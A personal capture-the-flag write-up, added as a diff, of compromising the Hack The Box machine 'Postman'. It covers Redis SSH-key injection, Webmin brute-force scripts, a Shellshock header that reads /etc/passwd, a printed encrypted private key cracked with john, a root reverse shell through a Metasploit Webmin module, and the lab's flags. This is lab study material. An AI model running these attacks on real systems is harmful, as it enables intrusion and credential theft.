@@ -1,0 +1,758 @@
+* nmap
+  #+begin_src bat
+  $ sudo nmap -sV -sC -oA postman 10.10.10.160
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  #+end_src
+  i imagined there might be a mail server, so let's do a full scan
+  #+begin_src bat
+  $ sudo nmap -p- -A -T4 -oA postman.full 10.10.10.160
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Cyber Geek's Personal Website
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+|_http-server-header: MiniServ/1.910
+  #+end_src
+  ok, this reveals a redis instance
+* http - port 80
+  just a static webpage:
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-02_09-01_1.png @ 2025-12-02 09:02:13
+  [[file:http_-_port_80/2025-12-02_09-02-13_2025-12-02_09-01_1.png]]
+
+  page source reveals nothing interesting
+* http - port 10000
+  tells us we might need to use https;
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-02_09-05.png @ 2025-12-02 09:05:23
+  [[file:http_-_port_10000/2025-12-02_09-05-23_2025-12-02_09-05.png]]
+
+  searching for exploits for =MiniServ 1.910= leads us to [[https://github.com/roughiz/Webmin-1.910-Exploit-Script][this poc]]:
+  #+begin_src bat
+  python2.7 webmin_exploit.py --rhost 10.10.10.160 --lhost 127.0.0.1 -p admin -u admin -s True --lport 4444
+  #+end_src
+  made a couple of changes in the script, however, it looks like it assumes the default creds
+  work, which they don't.
+  #+begin_src 
+  ('********** [+] [Exploit][ERROR] The authentication to the webmin server failed', 'red') 
+  #+end_src
+  let's look at other exploits
+* searchsploit
+  #+begin_src 
+  $ searchsploit webmin
+
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
+  #+end_src
+  however, upon trying this in msfconsole, it looks like it requires creds.
+  #+begin_src 
+  [-] Exploit aborted due to failure: unexpected-reply: 10.10.10.160:10000 - Invalid credentials (response code: 200)
+  #+end_src
+  let's park it for now
+* redis - anonymous login
+  #+begin_src bat
+  $ redis-cli -h 10.10.10.160
+
+10.10.10.160:6379> keys *
+(empty array)
+  #+end_src
+  looking at [[https://hackviser.com/tactics/pentesting/services/redis][redis exploits]], there are ways to upload webshells and get a reverse shell but
+  the first requires us to be able to =save= the config which results in an error and the second
+  is prevented by =strict_lua_mode=
+  #+begin_src bat
+  10.10.10.160:6379> config set dbfilename shell.php                                                                    
+OK                              
+  10.10.10.160:6379> config set dir /var/www/html            
+OK                            
+  10.10.10.160:6379> save
+(error) ERR
+  #+end_src
+  #+begin_src bat
+  10.10.10.160:6379> EVAL "return os.execute('whoami')" 0
+
+(error) ERR Error running script (call to f_fb93e053188094584eac805f5a99b7cf24e393d3): @enable_strict_lua:15: user_script:1: Script attempted to access nonexistent global variable 'os'
+  #+end_src
+* fuzz site on port 80
+  #+begin_src 
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.160:80/FUZZ -fs 166
+  #+end_src
+  returns nothing. try page fuzz:
+  #+begin_src 
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.160/FUZZ.html
+  #+end_src
+  only returns index
+* fuzz cgi pages
+  #+begin_src 
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://10.10.10.160:10000/FUZZ -fs 4566,0
+  #+end_src
+  nothing
+* webmin
+  tried a few other logins, but it displays an error saying access is blocked because of too
+  many failures, so possibly brute-forcing is not worth it?
+  #+begin_src python
+  import requests
+
+  url = "https://10.10.10.160/session_login.cgi"
+  data = {"user": "", "pass": ""}
+  
+  # the user/password lists are the seclists ones copied into current directory
+  for user in open("./userlist.txt"):
+      user = user.strip()
+      for pwd in open("./passwords.txt"):
+          pwd = pwd.strip()
+  
+          data["user"] = user
+          data["pass"] = pwd
+  
+          r = requests.post(url, data=data)
+          if "Login failed." not in r.text.strip():
+              print("[+] Hit:", user, pwd)
+  #+end_src
+  as expected, we get a connection refused error on running the script
+* shellshock
+  #+begin_src bat
+  $ curl -k -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' https://10.10.10.160:10000/session_login.cgi
+
+<h1>Error - Bad Header Contents user-agent</h1>
+  #+end_src
+* ffuf cgi script results
+   #+begin_src 
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://10.10.10.160:10000/FUZZ.cgi -fs 4566,0
+  #+end_src
+   this came back with =xmlrpc=, visiting 
+   #+begin_src 
+   https://10.10.10.160:10000/xmlrpc.cgi
+   #+end_src
+   we come across a basic auth page.
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-02_15-07.png @ 2025-12-02 15:07:38
+   [[file:ffuf_cgi_script_results/2025-12-02_15-07-38_2025-12-02_15-07.png]]
+* brute-force basic-auth
+  #+begin_src 
+  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt  10.10.10.160 -s 10000 https-get /xmlrpc.cgi
+  #+end_src
+  this returns false positives for everything.
+  intercepting the requset and response in burp:
+  #+begin_src 
+  GET /xmlrpc.cgi HTTP/1.1
+  Host: 10.10.10.160:10000
+  Cookie: redirect=1; testing=1
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: none
+  Sec-Fetch-User: ?1
+  Priority: u=0, i
+  Te: trailers
+  Connection: keep-alive
+  #+end_src
+  response:
+  #+begin_src html
+  HTTP/1.0 401 Unauthorized
+  Date: Tue, 2 Dec 2025 19:33:47 GMT
+  Server: MiniServ/1.910
+  WWW-authenticate: Basic realm="Webmin Server"
+  Connection: close
+  Content-type: text/html; Charset=iso-8859-1
+
+  <html>
+  <head><title>Unauthorized</title></head>
+  <body><h1>Unauthorized</h1>
+  A password is required to access this
+  web server. Please try again. <p>
+  </body></html>
+  #+end_src
+  let's use python to brute-force the creds
+  #+begin_src python
+  $ cat brute-force-basic.py
+
+import requests
+import base64
+
+URL = "https://10.10.10.160:10000/xmlrpc.cgi"
+userlist = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+passlist = "/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt"
+
+def try_creds(username, password):
+    auth_header = base64.b64encode(f"{username}:{password}".encode()).decode()
+    headers = {
+        "Authorization": f"Basic {auth_header}",
+        "Host": "10.10.10.160:10000",
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "*/*"
+    }
+
+    try:
+        r = requests.get(URL, headers=headers, verify=False, timeout=5)
+        return r
+    except Exception as e:
+        return None
+
+with open(userlist) as uf, open(passlist) as pf:
+    users = [u.strip() for u in uf]
+    passes = [p.strip() for p in pf]
+
+for u in users:
+    for p in passes:
+        print(f"[*] Trying {u}:{p}", end="\r")
+
+        r = try_creds(u, p)
+        if r is None:
+            continue
+
+        # Webmin returns 401 for invalid creds
+        if r.status_code not in [401, 403]:
+            print(r.text)
+            print(f"\n[+] POSSIBLE VALID CREDS: {u}:{p}")
+            print(f"[+] Status: {r.status_code}")
+            exit()
+
+print("\n[-] No valid credentials found in supplied lists.")
+  #+end_src
+  doesn't result in a hit
+  let's also try and brute-force the main login form at =session_login.cgi=
+  #+begin_src python
+  import requests
+
+  URL = "https://10.10.10.160:10000/session_login.cgi"
+  userlist = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+  passlist = "/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt"
+
+  # MiniServ usually requires these cookies
+  COOKIES = {
+      "redirect": "1",
+      "testing": "1"
+  }
+
+  HEADERS = {
+      "Host": "10.10.10.160:10000",
+      "User-Agent": "Mozilla/5.0",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Accept": "*/*"
+  }
+
+  def try_creds(username, password):
+      data = {
+	  "user": username,
+	  "pass": password
+      }
+
+      try:
+	  r = requests.post(
+	      URL,
+	      headers=HEADERS,
+	      cookies=COOKIES,
+	      data=data,
+	      verify=False,   # curl -k equivalent
+	      timeout=5
+	  )
+	  return r
+      except Exception:
+	  return None
+
+
+  with open(userlist) as uf, open(passlist) as pf:
+      users = [u.strip() for u in uf]
+      passes = [p.strip() for p in pf]
+
+  for u in users:
+      for p in passes:
+	  print(f"[*] Trying {u}:{p}", end="\r")
+
+	  r = try_creds(u, p)
+	  if r is None:
+	      continue
+
+	  # Webmin failures typically return 200 but with the same "Unauthorized" HTML.
+	  # So detect success by change in response *content*, not just code.
+	  body = r.text.lower()
+
+	  if ("You must enter a username and password to login to the server on" not in body and r.status_code != 403):
+	      print(f"\n[+] POSSIBLE VALID CREDS: {u}:{p}")
+	      print(f"[+] HTTP Status: {r.status_code}")
+	      exit()
+
+  print("\n[-] No valid credentials found in supplied lists.")
+  #+end_src
+  no hits.
+* redis
+  back to redis. possibly, the key to this is writing a reverse shell to some file and saving
+  it somewhere relevant and accessing it via either the apache or the webmin instance.
+  however, none of the relevent directories seem writable.
+  #+begin_src bat
+  10.10.10.160:6379> config set dir /usr/share/webmin
+  OK
+  10.10.10.160:6379> save
+  (error) ERR
+  10.10.10.160:6379> config set dir /usr/share/webmin/webmin
+  OK
+  10.10.10.160:6379> save
+  (error) ERR
+  #+end_src
+  the key is to find a directory which is writable and then accessing the shell
+* try other redis exploits
+  #+begin_src bat
+  eval 'local io_l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=io_l(); local f=io.popen("whoami","r"); local res=f:read("*a"); f:close(); return res' 0
+
+ERR @enable_strict_lua:15: user_script:1: Script attempted to access nonexistent global variable 'package'
+  #+end_src
+** clone the rogue-server exploit
+  #+begin_src bat
+  python redis-rce.py -r 10.10.10.160 -p 6379 -L 127.0.0.1 -f exp_lin.so
+  #+end_src
+  doesn't complete
+* guided mode
+  the hint suggests looking at writing ssh keys via redis. we'd tried this but we only looked
+  at writing to =/home/redis= which was blocked. apparently, =/var/lib/redis/.ssh/= works as a
+  place to store ssh keys. this was also mentioned in the [[https://hackviser.com/tactics/pentesting/services/redis][hackviser page]] on redis pentesting
+  but we missed it
+  #+begin_src bash
+  # Generate SSH key
+  ssh-keygen -t rsa -f redis_key
+
+  # Prepare key with newlines
+  (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
+
+  # Inject into authorized_keys
+  cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
+  redis-cli -h 10.10.10.160 config set dbfilename authorized_keys
+  redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
+  redis-cli -h 10.10.10.160 save
+  #+end_src
+  NOTE: we can also do the config stuff from inside redis-cli;
+  now we're able to ssh like so
+  #+begin_src bat
+  $ ssh -i redis_key redis@10.10.10.160 
+  #+end_src
+* credential hunting
+  we need to find a way to find creds to switch to the Matt user who we can see has the
+  =user.txt= in his home directory.
+  #+begin_src 
+  find / -user redis 2>/dev/null | less
+  #+end_src
+  reveals nothing useful
+** find all files within Matt's home directory where others have read permissions
+   #+begin_src bat
+   $ find /home/Matt/ -type f -perm -o=r 2>/dev/null
+
+/home/Matt/.bashrc
+/home/Matt/.selected_editor
+/home/Matt/.profile
+/home/Matt/.wget-hsts
+/home/Matt/.bash_logout
+   #+end_src
+   nothing interesting here
+* python server
+  inside =/var/www=, there's a python script for an HTTP server owned by Matt
+  #+begin_src 
+  redis@Postman:/var/www$ ls -l SimpleHTTPPutServer.py 
+
+-rw-rw-r-- 1 Matt Matt 482 Aug 25  2019 SimpleHTTPPutServer.py
+  #+end_src
+  turns out we can run this; it looks like it takes the arguments from the request and writes
+  it to some location
+  #+begin_src python
+  redis@Postman:/var/www$ cat SimpleHTTPPutServer.py
+
+# python -m SimpleHTTPPutServer 8080
+import SimpleHTTPServer
+import BaseHTTPServer
+
+class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_PUT(self):
+        print self.headers
+        length = int(self.headers["Content-Length"])
+        path = self.translate_path(self.path)
+        with open(path, "wb") as dst:
+            dst.write(self.rfile.read(length))
+
+
+if __name__ == '__main__':
+    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
+  #+end_src
+  let's run it:
+  #+begin_src bat
+  redis@Postman:/var/www$ python -m SimpleHTTPPutServer 8080
+
+Serving HTTP on 0.0.0.0 port 8080 ...
+  #+end_src
+  let's send a PUT request and see what happens:
+  #+begin_src bat
+  curl -X PUT http://10.10.10.160:8080/test.txt --data-binary 'hello world'
+
+Host: 10.10.10.160:8080
+User-Agent: curl/8.15.0
+Accept: */*
+Content-Length: 11
+Content-Type: application/x-www-form-urlencoded
+
+----------------------------------------
+Exception happened during processing of request from ('10.10.16.6', 54434)
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/SocketServer.py", line 290, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 318, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
+    self.handle()
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 340, in handle
+    self.handle_one_request()
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 328, in handle_one_request
+    method()
+  File "/var/www/SimpleHTTPPutServer.py", line 10, in do_PUT
+    with open(path, "wb") as dst:
+IOError: [Errno 13] Permission denied: '/var/www/test.txt'
+----------------------------------------
+  #+end_src
+  if we can execute this script as Matt, we could write an SSH key to his home directory and
+  gain access that way. let's check for suid binaries
+  #+begin_src bat
+  redis@Postman:/var/www$ find / -perm -4000 2>/dev/null
+
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/ping
+/bin/mount
+  #+end_src
+  #+begin_src bat
+  find / -user Matt -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+  #+end_src
+  reveals nothing.
+* guided mode - where can you find a backup of an ssh key that redis can read
+  suggests running =linpeas=. fuck.
+  download to our attack vm and use a python server to transfer to target
+  #+begin_src bat
+  $ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+linpeas.sh    100%
+  #+end_src
+  let's run it
+  #+begin_src bat
+  ./linpeas.sh -a > /dev/shm/linpeas.txt
+  #+end_src
+  we can find this output on reading the output
+  #+begin_src
+  ===== Analyzing SSH Files (limit 70) ====
+
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+  #+end_src
+  However, as we can see, it's encrypted: =Proc-Type: 4,ENCRYPTED=
+  we can confirm:
+  #+begin_src bat
+  ssh -i matt.key Matt@10.10.10.160
+
+Enter passphrase for key 'matt.key':
+  #+end_src
+  let's use john to crack it
+* crack sshkey password with john
+  #+begin_src 
+  $ ssh2john.py matt.key > matt.hash 
+  #+end_src
+  use it against the shorter password list first:
+  #+begin_src bash
+  $ john matt.hash --wordlist=/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 
+  #+end_src
+  no hits, now let's use rockyou; we crack it successfully
+  #+begin_src bash
+  $ john matt.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+computer2008     (matt.key)
+  #+end_src
+  however, upon trying to ssh to the machine, the connecion gets closed immediately
+  #+begin_src bat
+  $ ssh -i matt.key matt@10.10.10.160
+
+Enter passphrase for key 'matt.key':
+Connection closed by 10.10.10.160 port 22
+  #+end_src
+  but let's check if this password works for the Matt user:
+  #+begin_src 
+  redis@Postman:~$ su Matt
+  Password: 
+  Matt@Postman:~$ ls
+  user.txt
+  Matt@Postman:~$ cat user.txt
+  2b904e16685a63cb12f9426e755f974c
+  #+end_src
+  thus we get the user flag.
+* matt
+  let's check suod permissions
+  #+begin_src bat
+  Matt@Postman:~$ sudo -l
+
+[sudo] password for Matt: 
+Sorry, user Matt may not run sudo on Postman.
+  #+end_src
+** what files does Matt have access to
+   #+begin_src bat
+   find / -user Matt 2>/dev/null | less
+   #+end_src
+   only intersting one is the earlier python script we found.
+** which directories do we have write permissions on
+   #+begin_src bat
+   Matt@Postman:~/$ find / -type d -writable 2>/dev/null
+
+/run/lock
+/home/Matt
+/home/Matt/.gnupg
+/home/Matt/.gnupg/private-keys-v1.d
+/home/Matt/.ssh
+/home/Matt/.local
+/home/Matt/.local/share
+/home/Matt/.local/share/nano
+/home/Matt/.cache
+/tmp
+/tmp/.X11-unix
+/tmp/.Test-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/.ICE-unix
+/proc/40564/task/40564/fd
+/proc/40564/fd
+/proc/40564/map_files
+/var/lib/php/sessions
+/var/tmp
+/dev/mqueue
+/dev/shm
+   #+end_src
+** what are Matt's groups
+   #+begin_src 
+   Matt@Postman:/var/www$ groups
+
+Matt
+   #+end_src
+** what's writable via group permissions
+   #+begin_src 
+   $ find / -type d -group $(id -gn) -writable 2>/dev/null
+/home/Matt
+/home/Matt/.gnupg
+/home/Matt/.gnupg/private-keys-v1.d
+/home/Matt/.ssh
+/home/Matt/.local
+/home/Matt/.local/share
+/home/Matt/.local/share/nano
+/home/Matt/.cache
+/proc/56394/task/56394/fd
+/proc/56394/fd
+/proc/56394/map_files
+   #+end_src
+** env variables
+   =env= command reveals nothing interesting
+** run linpeas again
+   nothing new that's relevant
+** bash history
+   there are some interesting albeit a bit incoherent entries in Matt's bash history mostly
+   involving the python script and a few =su root= statements and cronjobs;
+   #+begin_src bat
+<SNIP>
+   python SimpleHTTPPutServer.py 8080
+   mv SimpleHTTPPutServer.py /var/www/html/SimpleHTTPPutServer.py
+   mv SimpleHTTPPutServer.py /var/www/html/
+   apt install apache2
+   su root
+   mv SimpleHTTPPutServer.py /var/www/html/
+   su root
+   cd /var/www/html
+   ls
+   python SimpleHTTPPutServer 8080
+   python -m SimpleHTTPPutServer 8080
+   service apache2 stop
+   rm index.html 
+   su root
+   exit
+   cd ..
+   crontab -e
+   reboot
+   exit
+<SNIP>
+   #+end_src
+** watch cronjobs
+   let's see if there's a root cronjob involving the script in which case we can just edit the
+   script and insert a reverse shell. for this, we can use the [[https://github.com/DominicBreuker/pspy?tab=readme-ov-file][pspy tool]]; check the
+   architecture of the target with =uname -m= and download and transfer the relevant binary and
+   run it; however, it comes up with nothing.
+** search for processes running as root
+   #+begin_src 
+   $ ps aux | grep root
+
+/usr/sbin/cron -f
+   #+end_src
+   interestingly, there's this cron job running which was also visible from the pspy output.
+   however, we cannot access it (also, the pspy tool is used to observe the effects of such
+   cronjobs)
+* guided mode - which vulnerable version of webmin is running
+  ok, interesting. we went through all of the webmin exploits [[https://www.bordergate.co.uk/exploiting-webmin/][listed here]], but couldn't find
+  anything without creds other than the [[https://www.exploit-db.com/exploits/47230][this]]. But this instance is not vulnerable to it. the
+  metasploit module returns with =target not vulnerable=, and fails on running it with =force=;
+  also tried to recreate the part where it figures out it's not vulnerable:
+  #+begin_src python
+  import requests
+
+  base_url = "https://10.10.10.160:10000"
+  target = base_url + "/password_change.cgi"
+  
+  headers = {
+      "Referer": base_url + "/session_login.cgi"
+  }
+  
+  cookies = {
+      "redirect": "1",
+      "testing": "1",
+      "sid": "x",
+      "sessiontest": "1"
+  }
+  
+  resp = requests.get(target, headers=headers, cookies=cookies, verify=False)
+  
+  print("Status:", resp.status_code)
+  print("Body:")
+  print(resp.text)
+  #+end_src
+  on running this, we get:
+  #+begin_src html
+  Status: 500
+  Body:
+  <h1>Error - Perl execution failed</h1>
+  <p>Password changing is not enabled! at /usr/share/webmin/password_change.cgi line 12.
+  </p>
+  #+end_src
+  there must be some way to find the creds now that we have access to the system.
+  well, fuck. took a peek at the writeup - we never bothered to check Matt's creds against
+  the app. and it works. so now let's do one of the credentialled attacks.
+  actually - *webmin uses local authentication* - ippsec, but also, we'd read this somewhere.
+* msfconsole
+  #+begin_src bat
+  msf > use exploit/linux/http/webmin_packageup_rce
+  msf exploit(linux/http/webmin_packageup_rce) > set LHOST tun0
+  msf exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
+  msf exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
+  msf exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
+  msf exploit(linux/http/webmin_packageup_rce) > set SSL true
+  [!] Changing the SSL option's value may require changing RPORT!
+  msf exploit(linux/http/webmin_packageup_rce) > run
+  
+  [*] Started reverse TCP handler on 10.10.16.6:4444 
+  [+] Session cookie: 21a8f1fff849e2c97fa61b0f41efe3b1
+  [*] Attempting to execute the payload...
+  [*] Command shell session 1 opened (10.10.16.6:4444 -> 10.10.10.160:37238) at 2025-12-06 03:06:50 +0100
+
+id                                                         
+uid=0(root) gid=0(root) groups=0(root)
+  #+end_src
+  this is a very basic shell which doesn't even allow us to cd. upgrade the shell with python
+  #+begin_src 
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+  root@Postman:/usr/share/webmin/package-updates/# cd
+  root@Postman:~# ls
+
+redis-5.0.0  root.txt
+
+  root@Postman:~# cat root.txt
+
+b1fd28e156e01155460ef5a47b722115
+  #+end_src
+* ippsec
+** redis-cli
+  searches for =redis home directory= to see where to put the keys, which is something we
+  didn't do
+** redis user
+  - searches for =writable= and =readable= files with the redis user.
+  - checks if =tmux= or =screen= is installed (not just to check open sessions, but to use the
+    multiplexing features)
+*** list files modified between 2 dates
+    #+begin_src bat
+    find / -newermt 2019-09-10 ! -newermt 2019-09-13 2>/dev/null
+    #+end_src
+    this date range was arrived at by looking at when Matt's home dir was created/modified
+*** run multiple enumeration scripts
+    also runs [[curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh][linenum.sh]]. (enables a thorough test with =thorough=1= inside the script)
+*** last login
+    looks at last login from Matt (via the above script) and intends to look at what the user
+    did around that point.
+    uses =stat= to check when the =id_rsa.bak= was created. turns out 6-7 mins after the last
+    login. says, *forensics is always a cool thing to do even on a pentest*
+    #+begin_src bat
+    $ stat /opt/id_rsa.bak 
+
+  File: /opt/id_rsa.bak
+  Size: 1743            Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d      Inode: 158996      Links: 1
+Access: (0755/-rwxr-xr-x)  Uid: ( 1000/    Matt)   Gid: ( 1000/    Matt)
+Access: 2025-12-07 10:22:14.641445726 +0000
+Modify: 2019-08-26 00:11:21.376045337 +0100
+Change: 2019-09-11 11:29:42.116000000 +0100
+ Birth: -
+    #+end_src
+** Matt
+   after switching to Matt with =su=, tries to see why ssh didn't work; looking at =sshd_config=,
+   it turns out there's a =DenyUsers= against Matt.
+** burpsuite to analyse how metsploit does the exploit
+   #+begin_src 
+   show advanced options
+   set proxy 127.0.0.1:8080
+   #+end_src
+   however, in our case, the proxy option is available on listing =options=
